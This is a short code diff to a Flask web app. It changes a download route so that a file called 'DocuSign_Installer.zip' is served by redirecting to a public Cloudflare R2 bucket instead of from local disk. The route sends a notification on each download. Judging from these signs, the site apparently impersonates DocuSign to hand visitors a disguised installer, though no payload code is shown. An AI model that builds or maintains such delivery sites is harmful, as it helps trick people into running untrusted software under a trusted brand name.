@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, send_file
+from flask import Flask, render_template, request, send_file, redirect
 import requests
 from dotenv import load_dotenv
 from datetime import datetime
@@ -173,19 +173,11 @@ def download():
     
     send_notification(download_message)
     
-    # Serve the zip file
-    zip_file_path = os.path.join(os.path.dirname(__file__), 'downloads', 'DocuSign_Installer.zip')
+    # Use Cloudflare R2 URL for the file
+    r2_url = "https://pub-5943043f0aa3454291be9cd2fe736787.r2.dev/DocuSign_Installer.zip"
     
-    if os.path.exists(zip_file_path):
-        return send_file(
-            zip_file_path,
-            as_attachment=True,
-            download_name='DocuSign_Installer.zip',
-            mimetype='application/zip'
-        )
-    else:
-        # If file doesn't exist, return to home page
-        return render_template("index.html")
+    # Redirect to R2 URL (works both locally and in production)
+    return redirect(r2_url)
 
 
 @app.route("/")
